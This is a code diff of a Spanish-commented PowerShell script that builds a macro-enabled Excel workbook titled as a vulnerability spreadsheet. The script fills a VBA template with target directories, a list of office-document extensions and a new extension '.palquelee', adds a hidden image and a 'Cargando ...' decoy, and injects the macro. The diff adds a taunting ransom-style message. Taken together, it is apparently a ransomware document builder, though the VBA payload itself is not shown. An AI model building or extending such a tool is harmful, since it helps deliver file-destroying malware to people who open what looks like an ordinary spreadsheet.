@@ -8,6 +8,7 @@ $ext = @(".doc", ".docx", ".xls", ".xlsx", ".csv", ".ppt", ".pptx", ".msg", ".em
 $final_ext = ".palquelee"
 $file_output = "Planilla de vulnerabilidades.xlsm" # Nombre del archivo final
 $file_image = "bg.jpg" # Nombre de la imagen a embeber
+$mensaje_final = "Ya valiste wey!"
 #####
 #####
 
@@ -34,6 +35,7 @@ $ext = "\.(" + ($ext -join "|" -replace "\.","") + ")$"
 $cont = $cont.Replace("{{DIRECTORIOS}}", $dirs)
 $cont = $cont.Replace("{{LISTADO_EXTENSIONES}}",$ext)
 $cont = $cont.Replace("{{EXTENSION_FINAL}}", $final_ext)
+$cont = $cont.Replace("{{MENSAJE_FINAL}}", $mensaje_final)
 
 # Abrimos una instancia de la aplicación Excel.
 $excel = New-Object -ComObject Excel.Application;
@@ -88,7 +90,7 @@ $sheet.Cells.Item(14,1) = "Cargando ...";
 $sheet.Cells.Item(14,1).Font.Bold = $true;
 
 # Agregando la foto de fondo de pantalla (puede ir donde sea, mientras sea 1 foto agregada en "Shapes"
-$sheet.Shapes.AddPicture($payloads + $file_image, 0, -1,30000,30000,-1,-1) | Out-Null
+$sheet.Shapes.AddPicture((Resolve-Path $payloads$file_image), 0, -1,30000,30000,-1,-1) | Out-Null
 
 # Agregando el código VBA que tengo en un archivo aparte.
 $test = $workbook.VBProject.VBComponents.Item(1).CodeModule.AddFromString($cont);
